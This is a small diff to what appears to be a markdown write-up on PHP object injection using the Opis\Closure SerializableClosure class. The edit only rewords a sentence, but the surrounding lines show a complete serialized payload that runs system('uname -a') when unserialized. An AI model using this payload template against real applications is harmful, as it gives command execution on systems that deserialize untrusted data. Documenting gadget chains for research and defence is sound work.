@@ -39,7 +39,7 @@ Returned code is executed inside **include**. The resulting POI string:
 <pre>
 C:32:"Opis\\Closure\\SerializableClosure":48:{a:1:{s:8:"function";s:19:"system('uname -a');";}}
 </pre>
-No need to search for \_\_invoke call.
+No need to search for \_\_invoke call to start POI.
 
 ![](./images/opis_doc_html_6896a5a96aca7b68.png)
 
